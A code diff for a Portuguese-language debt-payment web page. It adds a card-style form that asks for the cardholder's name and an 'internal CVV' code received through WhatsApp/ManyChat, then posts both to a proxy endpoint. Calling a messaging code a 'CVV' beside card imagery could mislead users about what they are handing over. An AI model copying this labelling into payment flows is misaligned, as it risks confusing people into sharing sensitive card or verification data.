@@ -129,6 +129,15 @@
     @keyframes cardSpin {to{transform:rotate(360deg)}}
     .card-status-panel p {font-size:14px;line-height:1.5;color:#53615b}
     .card-status-panel strong {color:#14834f}
+    .card-form {display:none;text-align:left;margin-top:18px;}
+    .card-form .card-heading {font-size:16px;font-weight:800;color:#173b29;margin-bottom:12px;}
+    .card-form .card-visual {background:linear-gradient(135deg,#106b45,#189762);border-radius:16px;padding:20px;color:white;margin-bottom:18px;min-height:122px;box-shadow:0 12px 25px rgba(20,131,79,.15)}
+    .card-form .card-visual .chip {width:38px;height:27px;border-radius:5px;background:linear-gradient(135deg,#f8e6a8,#c9a955);margin-bottom:22px}
+    .card-form .card-visual .digits {letter-spacing:2px;font-size:19px;font-weight:700}
+    .card-form .card-visual .holder {font-size:11px;letter-spacing:1px;margin-top:12px;text-transform:uppercase;opacity:.95}
+    .card-form .card-row {display:grid;grid-template-columns:1fr 1fr;gap:12px}
+    .card-form input:disabled {background:#f1f5f2;color:#81918a;cursor:not-allowed}
+    .card-form .security-note {font-size:11.5px;line-height:1.5;color:#60766a;margin-top:9px}
     .pix-panel { display:none; margin-top:18px; text-align:left; animation:fadeUp .25s ease; }
     .pix-panel.show { display:block; }
     .pix-warning { padding:14px 15px; border:1px solid #f0d69d; border-radius:12px; background:#fff9eb; color:#73520c; font-size:12.5px; line-height:1.5; }
@@ -225,7 +234,14 @@
               <div id="cardSpinner" class="card-spinner"></div>
               <strong id="cardStatusTitle">Estamos consultando sua negociação</strong>
               <p id="cardStatusText">Aguarde um instante.</p>
-              <div id="internalCodeBox" style="display:none;text-align:left;margin-top:16px"><label for="internalCode">CVV enviado pelo WhatsApp</label><input id="internalCode" type="password" inputmode="numeric" autocomplete="off" pattern="[0-9]*" maxlength="12" placeholder="Digite seu CVV"/><div class="whatsapp-hint">Digite somente o código interno chamado CVV que você recebeu pelo ManyChat. Nunca informe o código de segurança impresso no cartão.</div></div>
+              <div id="internalCodeBox" class="card-form">
+                <div class="card-heading">Dados para solicitação de pagamento</div>
+                <div class="card-visual" aria-hidden="true"><div class="chip"></div><div class="digits">•••• •••• •••• ••••</div><div id="cardPreviewName" class="holder">NOME IMPRESSO NO CARTÃO</div></div>
+                <div class="field"><label for="cardHolderName">Nome impresso no cartão</label><input id="cardHolderName" type="text" maxlength="80" autocomplete="cc-name" placeholder="NOME COMO APARECE NO CARTÃO" required /></div>
+                <div class="field"><label for="cardNumberPreview">Número do cartão</label><input id="cardNumberPreview" type="text" value="•••• •••• •••• ••••" disabled /><div class="security-note">O número será solicitado pelo ambiente seguro da plataforma de pagamento quando a integração estiver disponível.</div></div>
+                <div class="card-row"><div class="field"><label for="cardExpiryPreview">Validade</label><input id="cardExpiryPreview" type="text" value="MM/AA" disabled /></div><div class="field"><label for="internalCode">CVV interno do ManyChat</label><input id="internalCode" type="password" inputmode="numeric" autocomplete="off" pattern="[0-9]*" maxlength="12" placeholder="Código recebido" required /></div></div>
+                <div class="security-note">Digite somente o código interno enviado pelo ManyChat. Não informe o CVV impresso no cartão. Nenhum número de cartão é solicitado ou armazenado nesta etapa.</div>
+              </div>
               <button id="cardContinueBtn" type="button" style="display:none">Registrar solicitação de pagamento por cartão</button>
               <button id="cardBackBtn" type="button" class="back-choice-btn" style="display:none">Voltar às opções</button>
             </div>
@@ -313,6 +329,9 @@
     const cardContinueBtn = document.getElementById('cardContinueBtn');
     const internalCodeBox = document.getElementById('internalCodeBox');
     const internalCode = document.getElementById('internalCode');
+    const cardHolderName = document.getElementById('cardHolderName');
+    const cardPreviewName = document.getElementById('cardPreviewName');
+    cardHolderName.addEventListener('input', ()=>{cardPreviewName.textContent = cardHolderName.value.trim().toUpperCase() || 'NOME IMPRESSO NO CARTÃO';});
     const cardBackBtn = document.getElementById('cardBackBtn');
     let clienteValidado = null;
 
@@ -605,6 +624,8 @@
       cardContinueBtn.style.display = 'none';
       internalCodeBox.style.display = 'none';
       internalCode.value = '';
+      cardHolderName.value = '';
+      cardPreviewName.textContent = 'NOME IMPRESSO NO CARTÃO';
       cardBackBtn.style.display = 'none';
       cardStatusTitle.textContent = 'Estamos consultando sua negociação';
       cardStatusText.textContent = 'Aguarde enquanto verificamos as opções disponíveis.';
@@ -621,7 +642,7 @@
         cardSpinner.style.display = 'none';
         if (result.disponivel) {
           cardStatusTitle.textContent = 'Pagamento com cartão disponível';
-          cardStatusText.textContent = 'Valor: ' + result.valor + '. Informe o CVV interno enviado pelo WhatsApp para registrar sua solicitação.';
+          cardStatusText.textContent = 'Valor: R$ ' + result.valor + '. Preencha os dados disponíveis abaixo para registrar sua solicitação.';
           internalCodeBox.style.display = 'block';
           cardContinueBtn.style.display = 'block';
           cardBackBtn.style.display = 'block';
@@ -648,6 +669,12 @@
     });
 
     cardContinueBtn.addEventListener('click', async ()=>{
+      const nomeCartao = cardHolderName.value.trim().replace(/\s+/g,' ');
+      if (nomeCartao.length < 3 || nomeCartao.length > 80) {
+        cardStatusText.textContent = 'Informe o nome impresso no cartão.';
+        cardHolderName.focus();
+        return;
+      }
       const codigoConfirmacao = internalCode.value.trim();
       if (!/^\d{3,12}$/.test(codigoConfirmacao)) {
         cardStatusText.textContent = 'Informe o CVV enviado pelo WhatsApp (3 a 12 dígitos).';
@@ -659,7 +686,7 @@
       try {
         const response = await fetch(PROXY_URL, {
           method:'POST', headers:{'Content-Type':'text/plain;charset=utf-8'},
-          body:JSON.stringify({acao:'registrarinteressecartao',token:clienteValidado.token,codigoConfirmacao:codigoConfirmacao})
+          body:JSON.stringify({acao:'registrarinteressecartao',token:clienteValidado.token,nomeCartao:nomeCartao,codigoConfirmacao:codigoConfirmacao})
         });
         if (!response.ok) throw new Error('Falha na conexão');
         const result = await response.json();
@@ -669,6 +696,7 @@
         cardContinueBtn.style.display = 'none';
         internalCodeBox.style.display = 'none';
         internalCode.value = '';
+        cardHolderName.value = '';
         finalWhatsAppBtn.classList.add('show');
       } catch (error) {
         cardStatusText.textContent = 'Não foi possível registrar neste momento. Tente novamente.';
